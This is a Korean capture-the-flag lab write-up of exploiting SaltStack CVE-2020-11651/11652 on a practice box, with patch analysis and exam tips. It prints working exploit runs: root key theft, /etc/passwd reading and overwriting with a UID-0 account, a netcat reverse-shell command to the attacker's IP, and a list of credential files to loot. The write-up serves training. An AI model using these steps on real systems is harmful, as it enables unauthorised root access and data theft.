    Set up functions that are safe to execute when commands sent to the master
    without encryption and authentication
    """

    # These methods will be exposed to the transport layer by
    # MWorker._handle_clear
    expose_methods = (
        "ping",
        "publish",
        "get_token",
        "mk_token",
        "wheel",
        "runner",
    )
```

디스패처는 이제 `getattr`을 직접 쓰지 않고 `get_method()`를 거친다:

```python
# salt/master.py:1972
    async def _handle_clear(self, load):
        ...
        cmd = load["cmd"]
        method = self.clear_funcs.get_method(cmd)
        if not method:
            return {}, {"fun": "send_clear"}
```

`_prep_auth_info`는 목록에 없다 → `get_method()`가 `None` → 요청은 빈 응답으로 끝난다. **6개 이름만 통과하는 허용 목록**이 전부다.

**취약점 → 패치를 이렇게 요약해서 외워라**
**취약**: `if cmd.startswith('__'): return False` → `getattr(clear_funcs, cmd)` — **거부 목록**. 밑줄 두 개만 막았고 하나는 통과
**패치**: `if name in expose_methods` — **허용 목록**. 6개만 통과

이 대비가 곧 코드 리뷰 체크리스트다. **문자열로 함수를 고르는 코드를 보면 "무엇을 막는지"가 아니라 "무엇을 통과시키는지"를 찾는다.** 막는 목록만 있으면 그 자체가 결함이다.

**패치된 버전과 등급:**

| 항목 | 값 |
|---|---|
| **패치 릴리스** | **2019.2.4** · **3000.2** (이 둘뿐이다) |
| 이전 브랜치 (2015.8 ~ 2018.3) | 버전 번호가 붙은 공개 릴리스 **없음.** SaltStack Enterprise KB로만 패치 파일 배포 |
| CVE-2020-11651 CVSS v3.1 (NVD) | **9.8 CRITICAL** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| CVE-2020-11652 CVSS v3.1 (NVD) | 6.5 MEDIUM `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` · CWE-22 |
| 벤더 자체 등급 | SaltStack 공지는 11651을 **10.0**으로, VMware VMSA-2020-0009도 **10.0**(`S:C`)으로 매겼다 |
| CISA KEV 등재 | **2021-11-03** (실제 악용 확인). 연방기관 조치 기한 2022-05-03 |

**3000.2에는 패치가 만든 버그가 하나 남아 있다**
3000.2 릴리스 노트가 Known Issue로 명시한다 — `AESFuncs` 화이트리스트에 오타가 들어갔다. `minion_runner`여야 할 이름이 `_minion_runner`로 적혀 publish 모듈의 runner 메서드가 깨졌다.
**보안 패치가 기능을 깨뜨리는 전형**이고, 방어 관점에서는 "패치 후 회귀 테스트"를 정당화하는 근거다.

### 2-6. 왜 이 페이로드인가 — 요청 3개를 조각내기

이 박스에서 실제로 나간 요청은 세 종류다.

**① 키 탈취 (CVE-2020-11651)**

```python
{'cmd': '_prep_auth_info'}
```

| 조각 | 역할 |
|---|---|
| `enc: 'clear'` (PoC가 `crypt='clear'`로 채널을 만들며 자동으로 붙임) | `_handle_clear` 경로로 보내기 위해. `aes`면 복호화에 실패해 버려진다 |
| `cmd: '_prep_auth_info'` | 호출할 메서드 이름. **밑줄이 접근 제어가 아니라는 점이 취약점의 전부** |
| **인자 없음** | `token`도 `eauth`도 넣으면 안 된다. 넣으면 `else` 분기를 타지 않아 `key`가 `None`으로 남는다 — 넣지 않는 것이 페이로드다 |

**② 파일 읽기 (CVE-2020-11652)**

```python
{'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read',
 'path': '/etc/passwd', 'saltenv': 'base'}
```

| 조각 | 역할 |
|---|---|
| `key` | ①에서 훔친 root key. 이게 없으면 `check_authentication`에서 걸린다 |
| `cmd: 'wheel'` | `ClearFuncs.wheel()` 호출 — 정상 노출된 함수다. 여기서는 취약점이 아니라 정당한 API를 훔친 열쇠로 쓰는 것 |
| `fun: 'file_roots.read'` | wheel 시스템 안의 어느 모듈·함수인지 |
| `path` | 읽을 경로. **절대경로가 그대로 통했다**(실측). `find()`에 `isabs` 검사가 없고 `os.path.join`이 절대경로를 만나면 앞을 버리기 때문이다 |
| `saltenv: 'base'` | file_roots 환경 이름. salt 설정의 기본값이며, 없으면 어느 루트인지 정하지 못한다 |

**③ 파일 쓰기 → root 획득**

```python
{'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write',
 'path': '../../../../../etc/passwd', 'data': <passwd 내용>, 'saltenv': 'base'}
```

`fun`만 `read`→`write`로 바뀌고 `data`가 추가된다. **`path`가 상대경로여야 한다** — PoC가 클라이언트 쪽에서 강제한다:

```python
# exploit.py:345
    if args.upload_src:
        if os.path.isabs(args.upload_dest):
            print('[-] Destination path must be relative; aborting')
            sys.exit(1)
```

이 검사는 PoC의 고유 제약이 아니라 서버 동작을 미리 흉내낸 것이다. 취약 버전의 `file_roots.write()` 자신이 `if os.path.isabs(path): return '...is not relative to the environment...'`로 절대경로를 거부한다(2-4). PoC가 굳이 클라이언트에서 먼저 막는 것은 왕복 한 번을 아끼고 에러 메시지를 명확하게 하기 위해서다.

반면 **읽기(`find()`)에는 `isabs` 검사가 아예 없다.** 그래서 `-r /etc/passwd`가 절대경로 그대로 통했다 — `os.path.join('/srv/salt', '/etc/passwd')`가 앞부분을 버리고 `/etc/passwd`를 돌려주기 때문이다.

**실전 결론: 읽기는 절대경로, 쓰기는 `../`.**

---

## 3. Foothold — 인증 없이 root key 탈취

### 3-1. 취약 여부 확인 (인자 없이 실행)

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
```

![[Pasted image 20260611125348.png]]

**한 줄씩 읽는 법:**

| 출력 | 무슨 일이 일어난 것인가 |
|---|---|
| `DeprecationWarning: This module is deprecated` | PoC가 `salt.transport.client`를 import하는데, 최신 salt(여기서는 **3008.0**)에서는 `salt.channel.client`로 이름이 바뀌었다. **경고일 뿐 동작한다** — 하위호환 shim이 아직 살아 있다. 이 줄을 에러로 오인하고 되돌아가지 마라 |
| `status... ONLINE` | `{'cmd': 'ping'}`을 보내 타임아웃이 안 났다는 뜻(`exploit.py:44`). 4506이 열려 있고 msgpack 대화가 성립한다는 확인 |
| `CVE-2020-11651... YES` | `{'cmd': '_prep_auth_info'}` 응답이 비어 있지 않았다 |
| `root key obtained: ESet...` | 훔친 값. base64로 표현된 마스터 root key다 |

`--master`(=`-m`) 플래그: 없으면 기본값 `127.0.0.1`(`exploit.py:292`)이라 **자기 자신을 공격한다.** 조용히 실패하지 않고 `OFFLINE`을 찍고 `sys.exit(1)`하므로 다행히 눈에 띈다. `--port`(기본 `4506`)는 salt를 비표준 포트에 올린 경우에만 필요하다.

### 3-2. 임의 파일 읽기

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 -r /etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to read /etc/passwd from 192.168.189.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
```

![[Pasted image 20260611125525.png]]

**이 출력에서 읽어야 할 것 — 파일 하나로 정찰이 끝난다:**

| 줄 | 무엇을 알려주는가 |
|---|---|
| `nobody:x:99:99` · `/sbin/nologin` · UID 999→996 하강 | **RHEL/CentOS 7 계열 확정** (1-2 참조) |
| `mezz:...:/home/mezz:/bin/false` | 80포트의 **Mezzanine CMS** 실행 계정. 셸이 `/bin/false`라 이 계정으로는 SSH가 안 된다 |
| `named:x:25:25` | 53포트 NSD가 아니라 bind용 계정도 있다 — DNS가 둘일 수 있다 |
| `root:x:0:0:...:/bin/bash` | **root의 셸이 `/bin/bash`다.** 뒤에 심을 계정도 같은 셸을 줘야 로그인이 된다 |
| 두 번째 필드가 전부 `x` | 해시는 `/etc/shadow`에 있다. 하지만 shadow를 깨는 대신 passwd에 새 줄을 넣는 쪽이 압도적으로 빠르다(4장) |

**임의 파일 읽기를 얻으면 `/etc/passwd`가 1순위다**
자격증명이 없어도 OS·설치된 앱·계정 구조·홈 디렉터리 경로를 한 번에 준다. 그다음 순서:
1. `/etc/passwd` — 계정과 OS
2. `/etc/shadow` — 해시 (root로 읽히면 그 자체가 root 권한 증명)
3. `/root/.ssh/id_rsa` — 있으면 즉시 로그인
4. `/root/proof.txt`, `/home/*/local.txt` — **읽기만으로 플래그가 끝날 수도 있다**
5. 앱 설정 파일 (`/var/www/*/settings.py`, `wp-config.php`) — DB 자격증명 재사용

---

## 4. 권한상승 — `/etc/passwd`에 두 번째 root 심기

여기서 "권한상승"이라는 말은 사실 부정확하다. salt-master가 root로 돌기 때문에 임의 파일 쓰기는 이미 root 권한의 쓰기다. 남은 문제는 그 원시(primitive)를 **로그인 가능한 셸**로 바꾸는 것뿐이다.

### 4-1. 왜 `/etc/passwd`인가 — 세 후보의 비교

| 경로 | 필요한 것 | 이 박스에서의 판정 |
|---|---|---|
| `/etc/passwd`에 UID 0 줄 추가 | crypt 해시 1개, SSH 비밀번호 로그인 허용 | ✅ 채택. 22번이 열려 있고 즉시 검증 가능 |
| `/root/.ssh/authorized_keys` 덮어쓰기 | 키 쌍 생성, sshd의 `PubkeyAuthentication` 허용 | 🟡 성립했을 경로다. 당시에는 "`.ssh` 디렉터리가 없으면 못 만든다"고 판단해 접었으나 오판이었다 — `file_roots.write()`는 `os.makedirs(dest_dir)`로 없는 상위 디렉터리를 만들어준다(2-4). 게다가 비밀번호 인증이 꺼져 있어도 뚫린다는 점에서 `/etc/passwd`보다 견고하다 |
| `/etc/cron.d/`에 크론 파일 투입 | 크론 데몬, 최대 1분 대기 | 리버스셸이 필요하고 아웃바운드가 막혀 있었다(6장 ②) |
| `--exec`로 직접 명령 실행 | 리버스셸이 나갈 것 | ❌ 실패했다(6장 ②) |

> [!danger] `/etc/passwd`는 **덮어쓰기**다 — 원본을 먼저 읽어라
> `file_roots.write`는 파일을 통째로 교체한다. 추가(append)가 아니다.
> 그래서 순서가 반드시 **① 읽기 → ② 로컬에서 한 줄 추가 → ③ 전체 쓰기**여야 한다. 새 줄만 담아 올리면 **기존 계정이 전부 사라지고 시스템이 부팅 불능이 된다.** 시험이라면 그 박스는 리버트 대상이 되고, 실전이라면 서비스 장애다.
> 3-2에서 읽어둔 것이 이 때문이다.

### 4-2. crypt 해시 생성

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ openssl passwd a123a123
$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0
```

![[Pasted image 20260611125947.png]]

**해시 형식을 읽는 법:**

```
$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0
 │  │        └─ 해시 본문
 │  └─ salt (8자, 매번 랜덤 → 같은 비밀번호라도 결과가 다르다)
 └─ 알고리즘 ID
```

| ID | 알고리즘 | 비고 |
|---|---|---|
| (없음) | 전통 DES crypt | 비밀번호 **8자까지만** 유효. 쓰지 마라 |
| `$1$` | **MD5-crypt** | `openssl passwd`의 기본값. 낡았지만 glibc가 전부 지원한다 → 호환성이 가장 좋다 |
| `$5$` | SHA-256-crypt | `openssl passwd -5` |
| `$6$` | SHA-512-crypt | `openssl passwd -6`. 현대 리눅스의 기본 |

여기서 `$1$`(기본값)을 그대로 쓴 것이 옳은 판단이었다. 타겟이 CentOS 7이고 알고리즘 지원 여부를 확인할 방법이 없는 상황에서는 가장 오래되고 가장 널리 지원되는 형식이 실패 확률이 낮다. 강도는 여기서 아무 의미가 없다 — 우리가 비밀번호를 알고 있다.

**`openssl passwd` 대안과 함정**
- `openssl passwd -1 -salt xyz a123a123` — salt를 고정하면 재현 가능
- `mkpasswd -m sha-512 a123a123` — `whois` 패키지에 들어 있다. kali에 없을 수 있다
- `python3 -c 'import crypt; print(crypt.crypt("a123a123", "\$6\$salt"))'` — **Python 3.13에서 `crypt` 모듈이 제거됐다.** kali 최신 이미지에서는 이 원라이너가 죽는다. `openssl passwd`가 가장 안전한 선택인 이유다
- `perl -e 'print crypt("a123a123","\$6\$salt\$")'` — perl은 거의 항상 있다

### 4-3. passwd 파일 조립

3-2에서 읽은 내용을 로컬 파일로 저장하고 **맨 아래에 한 줄만** 추가한다:

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ cat passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
qq:$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0:0:0:root:/root:/bin/bash
```

![[Pasted image 20260611130140.png]]

**추가한 줄을 필드별로 해부한다** — 7개 필드는 `:`로 구분된다:

```
qq : $1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0 : 0 : 0 : root : /root : /bin/bash
│    │                                    │   │   │      │       └─ ⑦ 셸
│    │                                    │   │   │      └─ ⑥ 홈 디렉터리
│    │                                    │   │   └─ ⑤ GECOS (설명, 아무거나)
│    │                                    │   └─ ④ GID
│    │                                    └─ ③ UID  ★ 0 = root
│    └─ ② 비밀번호 필드  ★ 여기에 해시를 직접 넣는다
└─ ① 계정명 (기존과 겹치지 않게)
```

핵심은 두 가지다:

- **③ UID = 0.** 리눅스는 이름이 아니라 UID로 권한을 판정한다. `root`라는 이름에 특별함은 없다. UID 0인 계정이 여러 개 있어도 커널은 전부 root로 취급한다. `qq`가 root인 이유가 이것이다
- **② 비밀번호 필드에 해시를 직접 쓴다.** 이 필드가 `x`면 "해시는 `/etc/shadow`를 보라"는 뜻이다. 해시를 직접 넣으면 shadow를 아예 건드리지 않고 인증이 된다. `/etc/shadow`를 읽을 필요도, 쓸 필요도 없어진다 — **이것이 이 기법의 전부**다

**이 트릭이 성립하는 이유를 한 줄로**
`/etc/shadow`는 **passwd 필드가 `x`일 때만** 참조된다. shadow는 passwd를 **대체**한 게 아니라 **위임**한 것이라서, 위임을 취소하면 원래 자리로 돌아간다. 20년 전 형식이 아직 지원되기 때문에 통한다.

### 4-4. 업로드

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 --upload-src passwd --upload-dest ../../../../../etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to upload passwd to ../../../../../etc/passwd on 192.168.189.62
[ ] Wrote data to file /srv/salt/../../../../../etc/passwd
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `--upload-src passwd` | 보낼 로컬 파일 | 둘 중 하나만 주면 `[-] Must provide both --upload-src and --upload-dest`로 종료(`exploit.py:308`) |
| `--upload-dest ../../../../../etc/passwd` | 원격 목적지. 상대경로 강제 | 절대경로 `/etc/passwd`를 주면 `[-] Destination path must be relative; aborting`으로 종료(`exploit.py:345`) |

`[ ] Wrote data to file ...` — 대괄호 안이 `+`가 아니라 공백이다. PoC가 서버 응답 문자열을 그대로 출력하는 것뿐이고(`exploit.py:233`), 스크립트는 성공 여부를 판정하지 않는다. **성공 확인은 다음 단계의 SSH 로그인이다.**

---

## 5. 플래그

```bash
┌──(kali㉿kali)-[~/CTF/DEFCON2026]
└─$ ssh qq@192.168.189.62
The authenticity of host '192.168.189.62 (192.168.189.62)' can't be established.
ED25519 key fingerprint is SHA256:uYMZFN9vYkxFeoZ23/Znor6lCrABMH4HLFk4qNAIkB4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.189.62' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
qq@192.168.189.62's password:
[root@twiggy ~]# whoami
root
[root@twiggy ~]# ls
proof.txt
[root@twiggy ~]# cat proof.txt
3fd4954f15b0824c66637cf374e5afd0
[root@twiggy ~]#
```

![[Pasted image 20260611134941.png]]

비밀번호는 `a123a123`(4-2에서 해시로 만든 그 값)이다.

**프롬프트가 `[root@twiggy ~]#`인 것이 검증 그 자체다.** `qq`로 로그인했는데 셸이 `root`를 표시한다 — 3-2에서 확인한 대로 UID 0이라 셸이 계정명이 아니라 UID로 사용자를 표시하기 때문이다. `ls`가 곧바로 `proof.txt`를 보여준 것도 홈 디렉터리를 `/root`로 지정했기 때문이다.

| 플래그 | 경로 | 값 |
|---|---|---|
| proof | `/root/proof.txt` | `3fd4954f15b0824c66637cf374e5afd0` |

> [!warning] 시험 증거 형식 — 위 화면은 그대로 제출하면 감점이다
> OSCP는 플래그를 **`whoami` · `hostname` · `ip a`와 한 화면에** 요구한다. 위 세션에는 `ip a`가 없다.
> 습관으로 굳혀야 할 한 줄:
> ```bash
> whoami; hostname; ip a | grep 'inet '; cat /root/proof.txt
> ```
> 셸을 잡자마자 이걸 먼저 치고 스크린샷을 남긴다. **나중에 다시 들어가려다 박스가 리버트되면 증거가 사라진다.**

---

## 6. 막혔던 지점 / 시행착오

### ① 검색어를 서비스 이름으로 잡아 30분을 태웠다 — `zmtp`는 답이 아니다

첫 검색은 nmap이 준 이름 그대로였다:

```
Google: "Zeromq ZMTP 2.0 exploit"
```

결과 상위 3건이 전부 막다른 길이었다:

| 결과 | 왜 막다른 길인가 |
|---|---|
| HackerOne #477073 — ZeroMQ libzmq RCE | libzmq 라이브러리 자체의 파싱 버그. 이 박스와 무관 |
| F5 K000149074 — CVE-2014-9721 libzmq | 2014년 다운그레이드 공격. 무관 |
| zeromq/libzmq issue #3351 — `v2_decoder.cpp` | 소스 레벨 버그 리포트. 무관 |
| **Exploit-DB: Saltstack 3000.1 RCE** | ✅ 정답. 4번째였다 |

**frontmatter의 `cves:`에 CVE-2014-9721이 들어가 있지만 이 박스와 무관하다**
`extract.py`가 본문을 `CVE-\d{4}-\d{4,7}` 정규식으로 긁으므로, 막다른 길이라고 설명하려고 적은 번호까지 색인에 들어간다. `manual_tags: true`는 `tech/*` 태그만 막고 `cves`는 막지 못한다.
**이 박스의 CVE는 CVE-2020-11651과 CVE-2020-11652 둘뿐이다.**

**왜 헤맸는가**: nmap의 `SERVICE` 칼럼은 전송 프로토콜을 식별한 것이지 애플리케이션이 아니다. `zmtp`는 "HTTP"와 같은 층위의 답이고, 우리가 알아야 했던 건 "그 HTTP 위에 도는 게 WordPress냐 Jenkins냐"였다.

**어떻게 알아챘는가**: libzmq CVE들의 영향 버전이 전부 2014~2019년이고 원격 코드 실행이 되는 것도 아니어서 "이건 아니다"가 됐다. 그다음에 포트 번호로 검색을 다시 했어야 했는데, 다행히 EDB 결과가 같은 페이지에 있었다.

> [!danger] nmap의 `SERVICE` 이름은 **가설**이지 결론이 아니다
> 첫 검색어는 항상 **포트 번호**로 잡아라. `4505 4506 port`는 1페이지 전체가 SaltStack이다.
> 검색어 우선순위:
> 1. **포트 번호** (`"4505" "4506"`) — 제품을 특정한다
> 2. **정확한 버전 문자열** (`"nginx 1.16.1" exploit`) — 버전이 있을 때
> 3. **HTTP 타이틀·배너** (`"Home | Mezzanine"`) — 앱 이름을 준다
> 4. 서비스 이름 — **가장 마지막.** 전송 계층 이름일 수 있다
>
> 이 박스에서는 `zmtp`(4순위)로 시작해서 30분을 썼다. **1순위로 시작했으면 5분이었다.**

### ② `--exec` RCE가 "성공"했는데 셸이 안 붙었다 ★ 가장 큰 함정

root key를 얻은 직후, 가장 빠른 길로 보이는 `--exec`를 시도했다:

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 --exec "nc 192.168.45.173 4444 -e /bin/sh"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to execute nc 192.168.45.173 4444 -e /bin/sh on 192.168.189.62
[+] Successfully scheduled job: 20260611035400329542
```

![[Pasted image 20260611125419.png]]

**`[+] Successfully scheduled job: 20260611035400329542`가 찍혔다. 그런데 리스너에는 아무것도 오지 않았다.**

**PoC 코드를 보면 이 메시지가 아무것도 보증하지 않는다는 게 드러난다:**

```python
# exploit.py:235
def pwn_exec(channel, root_key, cmd, master_ip, jid):
    msg = {
        'key': root_key,
        'cmd': 'runner',
        'fun': 'salt.cmd',
        'saltenv': 'base',
        'user': 'sudo_user',
        'kwarg': {
            'fun': 'cmd.exec_code',
            'lang': 'python',
            'code': "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
        },
        'jid': jid,
    }
    ...
    if rets.get('jid'):
        print('[+] Successfully scheduled job: {}'.format(rets['jid']))
```

`rets`에 **`jid` 키가 있기만 하면** 성공 메시지를 찍는다. `jid`는 그냥 작업 ID를 발급받았다는 뜻이다 — 명령이 실행됐는지, 실행돼서 성공했는지는 **응답에 아예 담기지 않는다.** runner는 비동기라서 결과가 나중에 job cache로 들어간다.

**실패 후보 원인 (전부 확정하지 못했다 — 랩 반납 후라 재현 불가):**

| 후보 | 근거 | 판정 |
|---|---|---|
| **타겟에 `nc`가 없거나 `-e`가 없다** | CentOS 7 기본은 `nmap-ncat`. 최소 설치에는 nc 자체가 없는 경우가 흔하다 | `[가정]` **가장 유력** |
| **아웃바운드 방화벽** | nmap이 인바운드 65529포트를 `filtered`로 보고했다 — 앞단에 방화벽이 있다는 확증이고, 아웃바운드도 같은 정책일 개연성이 높다 | `[가정]` 유력 |
| runner 실행 자체가 실패 | `user: 'sudo_user'`가 하드코딩돼 있다(`exploit.py:244`). 존재하지 않는 사용자 이름이라 마스터 측 인가 단계에서 걸렸을 수 있다 | `[가정]` 가능 |
| `cmd.exec_code`/`lang: python` 미지원 | salt 버전에 따라 실행 모듈 이름이 다르다 | `[가정]` 가능 |

**어떻게 알아챘는가**: 리스너에 30초 넘게 아무것도 오지 않아서 알았다. **리스너를 미리 띄워두고, 성공 메시지가 아니라 리스너를 봤기 때문**에 오래 헤매지 않았다.

**어떻게 빠져나왔는가**: RCE를 고치려 하지 않고 **원시(primitive)를 바꿨다.** 같은 PoC가 제공하는 `--upload-src`/`--upload-dest`(임의 파일 쓰기)는 동기 호출이라 서버 응답을 즉시 받는다. 리버스셸을 포기하고 `/etc/passwd` + SSH로 간 것이 정답이었다.

> [!danger] 누적 패턴 — **"응답이 성공을 뜻하지 않는다"**
> ([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]])
> 이 박스의 판은 **"작업이 예약되었다 ≠ 명령이 실행되었다"**이다. 비동기 API는 접수증만 준다.
>
> **판별 규칙**: 도구가 성공을 말하면 **도구 바깥에서** 확인하라.
> - RCE → 리스너를 보거나, `; id > /tmp/x`로 부수효과를 남기고 파일 읽기로 회수
> - 파일 쓰기 → 같은 채널의 읽기로 되읽어 확인
> - 다운로드 → `ls -la`로 크기 확인
>
> **그리고 셸이 안 붙으면 셸을 고치려 들지 말고 다른 원시로 갈아타라.** 리버스셸은 아웃바운드에 의존하는 가장 깨지기 쉬운 수단이다.

**리버스셸이 안 붙을 때 의심 순서**
1. **리스너가 실제로 떠 있는가** — `ss -lntp | grep 4444`. tmux 창을 착각하는 사고가 잦다
2. **IP가 맞는가** — VPN 인터페이스 IP다(`ip a show tun0`). 여기서는 `192.168.45.173`
3. **아웃바운드 필터** — 4444는 자주 막힌다. **443/53/80으로 바꿔본다** (거의 항상 열려 있다)
4. **타겟에 그 바이너리가 있는가** — `nc`/`nc -e`/`bash -i`/`python3`. `-e`가 없는 nc가 표준이다
5. **명령 인용이 중간에 깨졌는가** — 여러 겹의 인용을 통과한다면 base64로 감싼다
6. **그래도 안 되면 셸을 포기한다** — 파일 쓰기·크론·SSH 키·`/etc/passwd`가 전부 셸 없이 root가 되는 길이다

### ③ PoC가 찍는 `Salt version:`은 타겟 버전이 아니다 — README와 코드가 어긋나 있다

저장소 README는 이런 출력을 보여준다:

```
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
```

그런데 실제 실행에는 이 두 줄이 없었다. 처음에는 "타겟 버전 판정에 실패했나?" 하고 의심했다.

git 이력을 보면 답이 나온다. 받은 시점의 HEAD가 바로 그 커밋이었다:

```
commit eca6ba2d0845ed99c43b65295e2d42a02e6bd4f8
Author: Jasper Lievisse Adriaanse <j@jasper.la>
Date:   Fri Jul 10 11:30:09 2020 +0200

    Rework version / vulnerability detection

    Don't bother checking the local salt version, it's irrelevant
```

제거된 코드:

```diff
-def check_salt_version():
-  print("[+] Salt version: {}".format(salt.version.__version__))
-  vi = salt.version.__version_info__
-    if check_salt_version():
-       print("[ ] This version of salt is vulnerable! Check results below")
-       print("[*] This version of salt does NOT appear vulnerable. Proceeding anyway as requested.")
```

`salt.version.__version__`은 import된 로컬 salt 패키지의 버전이다 — 즉 공격자 kali에 pip으로 깐 salt(3008.0)의 버전이지, 타겟의 버전이 아니다. 작성자 본인이 커밋 메시지에서 "irrelevant"라고 인정하고 지웠다. **README만 갱신되지 않은 것이다.**

결과적으로 이 박스에서 타겟의 salt 버전은 끝까지 확인하지 못했다. `_prep_auth_info`가 응답한 것 자체가 "취약하다"는 유일한 증거였고, 그것으로 충분했다.

**그리고 그게 정답이었다 — salt는 애초에 버전을 인증 없이 알려주지 않는다.** 소스를 뒤져 확인한 사실:

| 시도 | 결과 |
|---|---|
| 4506에 버전을 반환하는 명령 | 없다. ClearFuncs 13개 메서드 어디에도 버전 문자열을 돌려주는 것이 없다 |
| `_auth` 핸드셰이크 응답 | `{'enc': 'pub', 'pub_key': ..., 'publish_port': ...}` — 버전 필드 없음 |
| 8000 salt-api `GET /` | `{'return': 'Welcome', 'clients': [...]}` — 버전은 없지만 `clients` 목록이 릴리스마다 달라 거친 지문은 된다. `Server:` 헤더는 CherryPy 버전이지 salt 버전이 아니다 |

**그래서 버전 대신 "행위 차이"로 판정한다:**

```
{'cmd': 'ping'}              → 취약/패치 무관하게 응답 (ping은 화이트리스트에 있다)
{'cmd': '_prep_auth_info'}   → 취약: 키가 담긴 4-튜플
                              패치됨: 빈 dict {}
```

